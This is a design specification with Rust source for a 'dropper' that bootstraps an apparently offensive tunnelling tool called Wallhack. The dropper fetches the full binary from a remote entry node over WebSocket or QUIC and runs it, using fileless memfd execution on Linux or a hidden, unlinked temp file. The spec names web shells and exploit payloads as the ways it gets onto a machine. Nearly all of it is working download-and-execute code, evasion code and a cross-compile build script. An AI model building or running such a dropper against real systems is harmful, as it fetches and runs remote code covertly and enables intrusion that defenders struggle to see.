# Wallhack Dropper Specification v3

## Overview

The dropper is a minimal bootstrap binary that downloads and executes the full
Wallhack binary. It exists because uploading a 2-4MB binary through limited
channels (paste buffers, web shells, exploit payloads) is often impractical.

## Design Principles

1. **Identical CLI to wallhack** - Same arguments, dropper just fetches first
2. **Simple protocol selection** - `/tcp` or `/udp`, not transport
   implementation details
3. **Serve-self by default** - Entry serves its own binary, no separate binary
   store
4. **Fileless execution where possible** - memfd on Linux

## Protocol Addressing

Docker-style endpoint specification:

```
host:port[/protocol]

Examples:
  entry.com:443       # UDP (default)
  entry.com:443/udp   # UDP explicitly
  entry.com:443/tcp   # TCP
```

| Suffix           | Protocol  | Implementation      | Use Case                      |
| ---------------- | --------- | ------------------- | ----------------------------- |
| `/udp` (default) | QUIC      | Native QUIC streams | Fast, default choice          |
| `/tcp`           | WebSocket | WSS + yamux         | Proxy traversal, CDN fronting |

Users don't need to know about QUIC, WebSocket, or yamux. They just need to
know:

- **UDP** = fast, might get blocked by firewalls
- **TCP** = works through proxies, HTTP infrastructure

## Binary Size Targets

| Feature Flag | Protocol | Approx Size | Use Case                 |
| ------------ | -------- | ----------- | ------------------------ |
| `tcp`        | TCP/WSS  | 150-200KB   | Proxy/CDN environments   |
| `udp`        | UDP/QUIC | 400-500KB   | Direct access, max speed |

## Crate Structure

```
crates/
├── dropper/
│   ├── Cargo.toml
│   └── src/
│       ├── main.rs
│       ├── endpoint.rs     # host:port/proto parsing
│       ├── transport/
│       │   ├── mod.rs
│       │   ├── tcp.rs      # WebSocket (feature: tcp)
│       │   └── udp.rs      # QUIC (feature: udp)
│       ├── exec/
│       │   ├── mod.rs
│       │   ├── linux.rs
│       │   ├── windows.rs
│       │   └── darwin.rs
│       └── proto.rs
```

## Cargo.toml

```toml
[package]
name = "dropper"
version = "0.1.0"
edition = "2021"

[features]
default = ["tcp"]

# Protocol features - match your deployment
tcp = ["dep:tokio-tungstenite", "dep:tokio", "tokio/rt", "tokio/net", "tokio/io-util"]
udp = ["dep:quinn", "dep:tokio", "tokio/rt", "tokio/net", "tokio/time"]

[dependencies]
# Core - always included
rustls = { version = "0.23", default-features = false, features = ["ring", "std"] }
webpki-roots = "0.26"
sha2 = { version = "0.10", default-features = false }

# TCP protocol (WebSocket)
tokio-tungstenite = { version = "0.21", optional = true, default-features = false, features = ["rustls-tls-webpki-roots"] }

# UDP protocol (QUIC)
quinn = { version = "0.11", optional = true, default-features = false, features = ["rustls", "runtime-tokio"] }

# Async runtime
tokio = { version = "1", optional = true, default-features = false }

# Platform-specific
[target.'cfg(unix)'.dependencies]
libc = "0.2"

[target.'cfg(windows)'.dependencies]
windows-sys = { version = "0.52", features = ["Win32_System_Threading", "Win32_Foundation"] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
```

## Endpoint Parsing

```rust
// src/endpoint.rs

use std::str::FromStr;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Protocol {
    #[default]
    Udp,
    Tcp,
}

impl FromStr for Protocol {
    type Err = Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "udp" => Ok(Protocol::Udp),
            "tcp" => Ok(Protocol::Tcp),
            _ => Err(Error::InvalidProtocol(s.to_string())),
        }
    }
}

#[derive(Debug, Clone)]
pub struct Endpoint {
    pub host: String,
    pub port: u16,
    pub protocol: Protocol,
}

impl FromStr for Endpoint {
    type Err = Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        // Parse: host:port[/proto]
        // Examples:
        //   entry.com:443       -> UDP (default)
        //   entry.com:443/udp   -> UDP
        //   entry.com:443/tcp   -> TCP
        //   192.168.1.1:8443/tcp
        //   [::1]:443/udp       -> IPv6

        let (addr, protocol) = match s.rsplit_once('/') {
            Some((addr, proto)) => (addr, proto.parse()?),
            None => (s, Protocol::default()),
        };

        // Handle IPv6 [host]:port
        let (host, port) = if addr.starts_with('[') {
            // IPv6: [::1]:443
            let bracket_end = addr.find(']')
                .ok_or(Error::InvalidEndpoint("unclosed bracket".into()))?;
            let host = &addr[1..bracket_end];
            let port_str = addr.get(bracket_end + 2..)
                .ok_or(Error::InvalidEndpoint("missing port".into()))?;
            (host, port_str.parse()?)
        } else {
            // IPv4 or hostname: host:port
            let (host, port_str) = addr.rsplit_once(':')
                .ok_or(Error::InvalidEndpoint("missing port".into()))?;
            (host, port_str.parse()?)
        };

        Ok(Endpoint {
            host: host.to_string(),
            port,
            protocol,
        })
    }
}

impl std::fmt::Display for Endpoint {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let proto = match self.protocol {
            Protocol::Udp => "udp",
            Protocol::Tcp => "tcp",
        };

        if self.host.contains(':') {
            // IPv6
            write!(f, "[{}]:{}/{}", self.host, self.port, proto)
        } else {
            write!(f, "{}:{}/{}", self.host, self.port, proto)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_default_protocol() {
        let ep: Endpoint = "entry.com:443".parse().unwrap();
        assert_eq!(ep.host, "entry.com");
        assert_eq!(ep.port, 443);
        assert_eq!(ep.protocol, Protocol::Udp);
    }

    #[test]
    fn parse_explicit_tcp() {
        let ep: Endpoint = "entry.com:443/tcp".parse().unwrap();
        assert_eq!(ep.protocol, Protocol::Tcp);
    }

    #[test]
    fn parse_ipv6() {
        let ep: Endpoint = "[::1]:8443/udp".parse().unwrap();
        assert_eq!(ep.host, "::1");
        assert_eq!(ep.port, 8443);
        assert_eq!(ep.protocol, Protocol::Udp);
    }
}
```

## Protocol: Dropper Wire Format

Identical across TCP and UDP transports.

### Request (8 bytes)

```
Offset  Size  Field       Values
───────────────────────────────────────────────
0       4     magic       "WHDR" (0x57484452)
4       1     version     0x01
5       1     os          0=linux, 1=windows, 2=darwin
6       1     arch        0=amd64, 1=arm64, 2=i386
7       1     reserved    0x00
```

### Response

**Success:**

```
Offset  Size      Field
───────────────────────────────────────────────
0       1         status (0x00 = success)
1       8         size (u64 LE)
9       32        sha256
41      [size]    binary
```

**Error:**

```
Offset  Size      Field
───────────────────────────────────────────────
0       1         status (0x01-0xFF = error)
1       2         message length (u16 LE)
3       [len]     UTF-8 error message
```

## Main Entry Point

The dropper uses the **exact same CLI** as wallhack. It just downloads the real
binary first.

```rust
// src/main.rs

mod endpoint;
mod transport;
mod exec;
mod proto;

use endpoint::{Endpoint, Protocol};

fn main() {
    let args: Vec<String> = std::env::args().collect();

    // Parse args to find --connect endpoint
    let endpoint = parse_connect_arg(&args).unwrap_or_else(|e| {
        eprintln!("Error: {}", e);
        eprintln!("Usage: dropper --connect host:port[/tcp|udp] [OPTIONS]");
        std::process::exit(1);
    });

    // Validate we have the right transport compiled in
    #[cfg(all(not(feature = "tcp"), not(feature = "udp")))]
    compile_error!("At least one of 'tcp' or 'udp' features must be enabled");

    #[cfg(not(feature = "tcp"))]
    if endpoint.protocol == Protocol::Tcp {
        eprintln!("Error: TCP protocol requested but dropper built without 'tcp' feature");
        std::process::exit(1);
    }

    #[cfg(not(feature = "udp"))]
    if endpoint.protocol == Protocol::Udp {
        eprintln!("Error: UDP protocol requested but dropper built without 'udp' feature");
        std::process::exit(1);
    }

    // Download binary
    let binary = download(&endpoint).unwrap_or_else(|e| {
        eprintln!("Download failed: {}", e);
        std::process::exit(1);
    });

    // Verify hash (printed by download)
    eprintln!("[+] Downloaded {} bytes", binary.len());

    // Execute with same args (skip argv[0] which is "dropper")
    exec::run(&binary, &args[1..]);
}

fn parse_connect_arg(args: &[String]) -> Result<Endpoint, Error> {
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        if arg == "--connect" || arg == "-c" {
            let value = iter.next()
                .ok_or(Error::MissingValue("--connect"))?;
            return value.parse();
        }
        // Handle --connect=value
        if let Some(value) = arg.strip_prefix("--connect=") {
            return value.parse();
        }
    }
    Err(Error::MissingArg("--connect"))
}

fn download(endpoint: &Endpoint) -> Result<Vec<u8>, Error> {
    match endpoint.protocol {
        #[cfg(feature = "tcp")]
        Protocol::Tcp => transport::tcp::download(endpoint),

        #[cfg(feature = "udp")]
        Protocol::Udp => transport::udp::download(endpoint),

        #[allow(unreachable_patterns)]
        _ => unreachable!(),
    }
}
```

## Transport: TCP (WebSocket)

```rust
// src/transport/tcp.rs

use crate::endpoint::Endpoint;
use crate::proto::{self, Request, Response};
use tokio_tungstenite::{connect_async_tls_with_config, tungstenite::Message};
use futures::{SinkExt, StreamExt};

pub fn download(endpoint: &Endpoint) -> Result<Vec<u8>, Error> {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_io()
        .enable_time()
        .build()?;

    rt.block_on(download_async(endpoint))
}

async fn download_async(endpoint: &Endpoint) -> Result<Vec<u8>, Error> {
    let url = format!("wss://{}:{}/", endpoint.host, endpoint.port);

    eprintln!("[*] Connecting to {} (TCP/WebSocket)", endpoint);

    // Connect with TLS
    let (mut ws, _) = connect_async_tls_with_config(
        &url,
        None,
        false,
        None,
    ).await?;

    eprintln!("[+] Connected, requesting binary");

    // Send dropper request
    let req = proto::build_request();
    ws.send(Message::Binary(req.to_vec())).await?;

    // Read response
    let mut response_buf = Vec::new();

    while let Some(msg) = ws.next().await {
        match msg? {
            Message::Binary(data) => {
                response_buf.extend(data);

                // Check if complete
                if let Some(binary) = proto::try_parse_response(&response_buf)? {
                    return Ok(binary);
                }
            }
            Message::Close(_) => break,
            _ => continue,
        }
    }

    Err(Error::IncompleteResponse)
}
```

## Transport: UDP (QUIC)

```rust
// src/transport/udp.rs

use crate::endpoint::Endpoint;
use crate::proto::{self, Request, Response};
use quinn::{ClientConfig, Endpoint as QuinnEndpoint};
use std::sync::Arc;

pub fn download(endpoint: &Endpoint) -> Result<Vec<u8>, Error> {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_io()
        .enable_time()
        .build()?;

    rt.block_on(download_async(endpoint))
}

async fn download_async(endpoint: &Endpoint) -> Result<Vec<u8>, Error> {
    eprintln!("[*] Connecting to {} (UDP/QUIC)", endpoint);

    // Create QUIC endpoint
    let mut quic = QuinnEndpoint::client("0.0.0.0:0".parse()?)?;
    quic.set_default_client_config(client_config()?);

    // Connect
    let addr = format!("{}:{}", endpoint.host, endpoint.port).parse()?;
    let conn = quic.connect(addr, &endpoint.host)?.await?;

    eprintln!("[+] Connected, requesting binary");

    // Open bidirectional stream
    let (mut send, mut recv) = conn.open_bi().await?;

    // Send request
    let req = proto::build_request();
    send.write_all(&req).await?;
    send.finish().await?;

    // Read response (limit to 50MB)
    let response_buf = recv.read_to_end(50 * 1024 * 1024).await?;

    // Parse
    proto::parse_response(&response_buf)
}

fn client_config() -> Result<ClientConfig, Error> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());

    let crypto = rustls::ClientConfig::builder()
        .with_root_certificates(roots)
        .with_no_client_auth();

    Ok(ClientConfig::new(Arc::new(crypto)))
}
```

## Protocol Helpers

```rust
// src/proto.rs

use sha2::{Sha256, Digest};

pub const MAGIC: &[u8; 4] = b"WHDR";
pub const VERSION: u8 = 0x01;

pub fn build_request() -> [u8; 8] {
    let os = if cfg!(target_os = "linux") { 0x00 }
             else if cfg!(target_os = "windows") { 0x01 }
             else { 0x02 }; // darwin

    let arch = if cfg!(target_arch = "x86_64") { 0x00 }
               else if cfg!(target_arch = "aarch64") { 0x01 }
               else { 0x02 }; // i386

    [
        MAGIC[0], MAGIC[1], MAGIC[2], MAGIC[3],
        VERSION,
        os,
        arch,
        0x00, // reserved
    ]
}

pub fn try_parse_response(buf: &[u8]) -> Result<Option<Vec<u8>>, Error> {
    if buf.is_empty() {
        return Ok(None);
    }

    let status = buf[0];

    if status != 0x00 {
        // Error response
        if buf.len() < 3 {
            return Ok(None); // Need more data
        }
        let msg_len = u16::from_le_bytes([buf[1], buf[2]]) as usize;
        if buf.len() < 3 + msg_len {
            return Ok(None);
        }
        let msg = String::from_utf8_lossy(&buf[3..3 + msg_len]);
        return Err(Error::ServerError(msg.to_string()));
    }

    // Success response
    if buf.len() < 41 {
        return Ok(None); // Need header
    }

    let size = u64::from_le_bytes(buf[1..9].try_into().unwrap()) as usize;
    let expected_hash: [u8; 32] = buf[9..41].try_into().unwrap();

    if buf.len() < 41 + size {
        return Ok(None); // Need more binary data
    }

    let binary = buf[41..41 + size].to_vec();

    // Verify hash
    let mut hasher = Sha256::new();
    hasher.update(&binary);
    let actual_hash: [u8; 32] = hasher.finalize().into();

    if actual_hash != expected_hash {
        return Err(Error::HashMismatch);
    }

    eprintln!("[+] Verified SHA256: {}", hex::encode(actual_hash));

    Ok(Some(binary))
}

pub fn parse_response(buf: &[u8]) -> Result<Vec<u8>, Error> {
    try_parse_response(buf)?.ok_or(Error::IncompleteResponse)
}
```

## Execution

```rust
// src/exec/mod.rs

#[cfg(target_os = "linux")]
mod linux;
#[cfg(target_os = "windows")]
mod windows;
#[cfg(target_os = "macos")]
mod darwin;

pub fn run(binary: &[u8], args: &[String]) -> ! {
    #[cfg(target_os = "linux")]
    linux::exec(binary, args);

    #[cfg(target_os = "windows")]
    windows::exec(binary, args);

    #[cfg(target_os = "macos")]
    darwin::exec(binary, args);

    #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
    {
        eprintln!("Unsupported platform");
        std::process::exit(1);
    }
}
```

```rust
// src/exec/linux.rs

use std::ffi::CString;
use std::io::Write;
use std::os::unix::io::{FromRawFd, IntoRawFd};

pub fn exec(binary: &[u8], args: &[String]) -> ! {
    // Try memfd first (fileless)
    match memfd_exec(binary, args) {
        Ok(never) => never,
        Err(e) => {
            eprintln!("[!] memfd failed ({}), falling back to temp file", e);
            tempfile_exec(binary, args)
        }
    }
}

fn memfd_exec(binary: &[u8], args: &[String]) -> Result<!, std::io::Error> {
    use std::os::unix::process::CommandExt;

    let name = CString::new("").unwrap();
    let fd = unsafe { libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC) };

    if fd < 0 {
        return Err(std::io::Error::last_os_error());
    }

    // Write binary to memfd
    let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
    file.write_all(binary)?;

    // Get fd back (write consumes it)
    let fd = file.into_raw_fd();

    // Seal it
    unsafe {
        libc::fcntl(
            fd,
            libc::F_ADD_SEALS,
            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE,
        );
    }

    let path = format!("/proc/self/fd/{}", fd);
    eprintln!("[*] Executing via memfd");

    let err = std::process::Command::new(&path)
        .args(args)
        .exec();

    Err(err.into())
}

fn tempfile_exec(binary: &[u8], args: &[String]) -> ! {
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::process::CommandExt;

    // Random filename
    let random: u64 = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64;
    let path = format!("/tmp/.{:x}", random);

    // Write
    std::fs::write(&path, binary).expect("failed to write temp file");
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();

    // Unlink before exec (file stays open until process exits)
    let _ = std::fs::remove_file(&path);

    eprintln!("[*] Executing via temp file");

    let err = std::process::Command::new(&path)
        .args(args)
        .exec();

    panic!("exec failed: {}", err);
}
```

```rust
// src/exec/windows.rs

use std::ptr;

pub fn exec(binary: &[u8], args: &[String]) -> ! {
    use windows_sys::Win32::System::Threading::*;
    use windows_sys::Win32::Foundation::*;

    // Random filename in temp
    let random: u64 = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64;

    let temp = std::env::temp_dir();
    let path = temp.join(format!("{:x}.exe", random));
    let path_str = path.to_string_lossy();

    // Write binary
    std::fs::write(&path, binary).expect("failed to write temp file");

    // Build command line
    let cmdline = format!("\"{}\" {}", path_str, args.join(" "));
    let cmdline_wide: Vec<u16> = cmdline.encode_utf16().chain(Some(0)).collect();

    eprintln!("[*] Executing via CreateProcess");

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let success = unsafe {
        CreateProcessW(
            ptr::null(),
            cmdline_wide.as_ptr() as *mut _,
            ptr::null(),
            ptr::null(),
            FALSE,
            0,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi,
        )
    };

    if success == 0 {
        panic!("CreateProcess failed: {}", std::io::Error::last_os_error());
    }

    unsafe {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    std::process::exit(0);
}
```

## Entry Node: Serving Droppers

The entry node serves its own binary by default. Dropper requests are detected
by magic bytes.

```rust
// In wallhack entry node

use std::env;

/// Get our own binary for serving to droppers
fn get_self_binary() -> Vec<u8> {
    let exe_path = env::current_exe().expect("failed to get current exe");
    std::fs::read(&exe_path).expect("failed to read current exe")
}

/// Handle incoming connection - detect dropper or full binary node
async fn handle_connection(stream: TlsStream<TcpStream>) {
    // Peek first 4 bytes
    let mut magic = [0u8; 4];
    // ... peek logic depends on transport

    if &magic == b"WHDR" {
        handle_dropper(stream).await;
    } else {
        handle_node(stream).await;
    }
}

async fn handle_dropper(mut stream: impl AsyncRead + AsyncWrite + Unpin) {
    // Read full request (8 bytes)
    let mut req = [0u8; 8];
    stream.read_exact(&mut req).await.unwrap();

    // Validate
    if &req[0..4] != b"WHDR" || req[4] != 0x01 {
        send_error(&mut stream, 0x03, "Invalid request").await;
        return;
    }

    let os = req[5];
    let arch = req[6];

    // For now, we only serve our own binary (same os/arch)
    let my_os = if cfg!(target_os = "linux") { 0x00 }
                else if cfg!(target_os = "windows") { 0x01 }
                else { 0x02 };
    let my_arch = if cfg!(target_arch = "x86_64") { 0x00 }
                  else if cfg!(target_arch = "aarch64") { 0x01 }
                  else { 0x02 };

    if os != my_os || arch != my_arch {
        send_error(&mut stream, 0x01,
            &format!("Binary not available for os={} arch={}", os, arch)).await;
        return;
    }

    // Serve self
    let binary = get_self_binary();
    let hash = sha256(&binary);

    // Send response
    stream.write_all(&[0x00]).await.unwrap(); // status
    stream.write_all(&(binary.len() as u64).to_le_bytes()).await.unwrap();
    stream.write_all(&hash).await.unwrap();
    stream.write_all(&binary).await.unwrap();

    tracing::info!("Served self binary ({} bytes) to dropper", binary.len());
}

async fn send_error(stream: &mut (impl AsyncWrite + Unpin), code: u8, msg: &str) {
    let msg_bytes = msg.as_bytes();
    stream.write_all(&[code]).await.ok();
    stream.write_all(&(msg_bytes.len() as u16).to_le_bytes()).await.ok();
    stream.write_all(msg_bytes).await.ok();
}
```

## CLI Examples

```bash
# Entry node - listens on both protocols (same port, different protocols)
wallhack entry --listen 0.0.0.0:443/udp --listen 0.0.0.0:443/tcp

# Exit node via UDP (QUIC) - default
wallhack exit --connect entry.com:443

# Exit node via TCP (WebSocket) - for proxy traversal
wallhack exit --connect entry.com:443/tcp

# Dropper - same syntax, fetches binary first
dropper exit --connect entry.com:443/tcp
# Downloads full wallhack binary, then execs:
# wallhack exit --connect entry.com:443/tcp
```

## Build Matrix

```bash
#!/bin/bash

TARGETS=(
    "x86_64-unknown-linux-musl"
    "aarch64-unknown-linux-musl"
    "x86_64-pc-windows-gnu"
)

for target in "${TARGETS[@]}"; do
    for proto in tcp udp; do
        echo "Building dropper-${proto} for ${target}"

        cargo build --release \
            --target "$target" \
            --package dropper \
            --no-default-features \
            --features "$proto"

        case "$target" in
            *windows*) ext=".exe" ;;
            *) ext="" ;;
        esac

        src="target/${target}/release/dropper${ext}"
        dst="dist/dropper-${proto}-${target}${ext}"

        mkdir -p dist
        cp "$src" "$dst"
        [[ "$target" != *windows* ]] && strip "$dst"

        size=$(stat -f%z "$dst" 2>/dev/null || stat -c%s "$dst")
        echo "  -> $dst ($((size / 1024))KB)"
    done
done
```

## Expected Sizes

```
dropper-tcp-x86_64-unknown-linux-musl     ~180KB
dropper-tcp-x86_64-pc-windows-gnu         ~220KB
dropper-udp-x86_64-unknown-linux-musl     ~450KB
dropper-udp-x86_64-pc-windows-gnu         ~500KB
```

## Future Enhancements

1. **Binary store** - Serve cross-compiled binaries for different os/arch
2. **Compression** - ZSTD compress binary in transit
3. **Certificate pinning** - `--fingerprint SHA256:xxx` flag
4. **Proxy support** - `--proxy http://host:port` for TCP dropper
